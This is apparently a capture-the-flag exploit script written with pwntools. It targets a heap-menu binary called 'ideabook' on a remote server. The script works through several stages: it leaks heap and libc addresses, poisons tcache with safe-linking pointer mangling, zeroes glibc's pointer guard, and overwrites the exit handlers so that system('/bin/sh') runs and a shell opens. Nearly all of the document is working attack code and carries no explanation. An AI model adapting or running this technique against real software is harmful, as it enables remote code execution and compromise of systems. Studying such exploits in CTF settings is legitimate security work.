from pwn import *
#io = process("./ideabook",aslr=True)
io = remote("34.170.146.252",17253)
libc = ELF("./libc.so.6")

def create(idx,sz):
    io.sendlineafter(b"> ",b"1")
    io.sendlineafter(b"Index:",str(idx).encode())
    io.sendlineafter(b"Size:",str(sz).encode())

def edit(idx,content):
    io.sendlineafter(b"> ",b"2")
    io.sendlineafter(b"Index:",str(idx).encode())
    io.sendlineafter(b"Content:",content)

def read(idx,n):
    io.sendlineafter(b"> ",b"3")
    io.sendlineafter(b"Index:",str(idx).encode())
    io.recvuntil(b"Content: ")
    return io.recv(n)

def delete(idx):
    io.sendlineafter(b"> ",b"4")
    io.sendlineafter(b"Index:",str(idx).encode())

def mangle(dest,pos):
    # mangle heap ptr, (storage pos >> 12) ^ dest
    return (pos >> 12) ^ dest

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))



# setup overflow at chunk 16
create(16,0x0)
create(0,0x10)

# leak heap
# 16, 0, 1, 2
create(1,0x10)
create(2,0x10)
delete(2)
delete(1)
heap_base = u64(read(16,0x70)[0x60:0x68]) << 12
log.info("HEAP BASE: " + hex(heap_base))

# setup chunks for future tcache poisoning
create(1,0x20)
create(2,0x20)
delete(2)
delete(1)

# leak libc
for i in range(1,9):
    create(i,0x100)

create(10,0x30)
for i in range(1,9):
    delete(i)

libc.address = u64(read(16,0x858)[-8:]) - 0x21ace0
log.info("LIBC BASE: " + hex(libc.address))

# tcache poison 0x20 byte chunks, and overwrite pointer_guard in fs_base
# setup tcache poison for 0x20 and 0x30 chunks
# first target is overwriting fs_base pointer guard, second is to overwrite exit_handlers
target1 = mangle(libc.address - 0x2890, heap_base + 0x2e0)
target2 = mangle(libc.address + 0x21bf10, heap_base + 0x320)

heap_chunks  = [0,0,0,0x21,0,0,0,0x21]
heap_chunks += [target1,0,0,0x21,0,0,0,0x31]
heap_chunks += [target2,0]

payload = b""
for i in heap_chunks:
    payload += p64(i)
edit(16,payload)

# overwrite pointer guard
create(1,0x10)
create(2,0x10) # <- should be pointing to fs_base+0x30, and nullify pointer guard

# overwrite initial (exit_funcs)
create(3,0x20)
create(4,0x20)

exit_object = p64(4) + p64(rol(libc.symbols["system"],0x11,64)) + p64(next(libc.search("/bin/sh")))
edit(4,exit_object)


#gdb.attach(io,gdbscript="x/24gx 0x555555558060")
io.sendlineafter(b">",b"5")
io.interactive()
